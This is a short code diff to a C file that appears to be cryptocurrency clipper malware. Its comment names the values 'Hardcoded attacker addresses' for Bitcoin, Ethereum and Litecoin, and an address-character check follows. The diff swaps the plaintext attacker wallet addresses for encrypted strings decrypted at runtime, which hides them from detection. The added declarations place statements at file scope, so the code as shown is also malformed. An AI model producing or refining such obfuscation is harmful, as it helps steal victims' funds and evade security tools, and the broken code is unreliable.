@@ -6,9 +6,9 @@
 #include <ctype.h>
 
 /* Hardcoded attacker addresses */
-static const char *btc_addr = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
-static const char *eth_addr = "0x0000000000000000000000000000000000000000";
-static const char *ltc_addr = "ltc1qw508d6qejxtdg4y5r3zarvary0c5xw7kgmn4n9";
+static char btc_addr[64] = {0}; static int btc_init = 0; if (!btc_init) { enc_decrypt(enc_btc_addr, ENC_BTC_ADDR_LEN, btc_addr); btc_init = 1; }
+static char eth_addr[64] = {0}; static int eth_init = 0; if (!eth_init) { enc_decrypt(enc_eth_addr, ENC_ETH_ADDR_LEN, eth_addr); eth_init = 1; }
+static char ltc_addr[64] = {0}; static int ltc_init = 0; if (!ltc_init) { enc_decrypt(enc_ltc_addr, ENC_LTC_ADDR_LEN, ltc_addr); ltc_init = 1; }
 
 static int is_btc_char(char c) {
     return (c >= 'A' && c <= 'H') || (c >= 'J' && c <= 'N') ||
